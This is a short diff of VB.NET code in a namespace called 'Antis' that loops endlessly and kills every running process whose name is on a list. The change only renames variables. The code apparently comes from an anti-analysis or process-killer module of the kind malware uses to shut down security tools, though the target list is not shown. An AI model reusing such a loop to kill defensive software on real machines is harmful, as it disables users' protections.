@@ -13,9 +13,9 @@ Namespace Antis
             Try
                 Do While x = True
                     For Each PrName As String In ProcessName
-                        Dim Black() As Process = System.Diagnostics.Process.GetProcessesByName(PrName)
-                        For Each Hacker As Process In Black
-                            Hacker.Kill()
+                        Dim ProcessList() As Process = System.Diagnostics.Process.GetProcessesByName(PrName)
+                        For Each proc As Process In ProcessList
+                            proc.Kill()
                         Next
                     Next
 
